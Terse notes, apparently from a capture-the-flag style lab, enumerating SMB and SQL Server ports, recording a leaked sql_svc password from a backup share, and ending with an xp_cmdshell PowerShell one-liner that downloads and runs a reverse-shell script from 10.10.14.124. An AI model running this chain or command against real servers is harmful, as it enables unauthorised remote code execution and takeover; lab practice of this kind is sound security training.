
A) PORT

1] 135  ---> RPC          ---> SAMBA
2] 139  ---> netbios-ssn
4] 445  ---> microsoft-ds
3] 1433 ---> SQL Server   ---> Microsoft SQL Server 2017 RTM

OS      ---> Windows Server 2008

SMB     ----> security message signing disabled [default

B) SCRIPT

smb              ---> (likely) VULNERABLE to CVE-2008-4250 (RCE) [NOT VULNERABLE]

os-smb-discovery ---> Windows Server 2019  


C) 

SMB ---> anonymous user ACCESS DENIED ---> [default and] backup folder avaiable

backup ---> USERNAME = sql_svc     } sql server
       ---> PASSWORD = M3g4c0rp123 } credential

mssqlclient ---> upload shell2v2.ps1 shell for gain the access

EXPLOIT COMPLETE
   








STUFF

xp_cmdshell "powershell.exe -c IEX ((new-object net.webclient).downloadstring(\"http://10.10.14.124:80/shell2v2.ps1\"))"


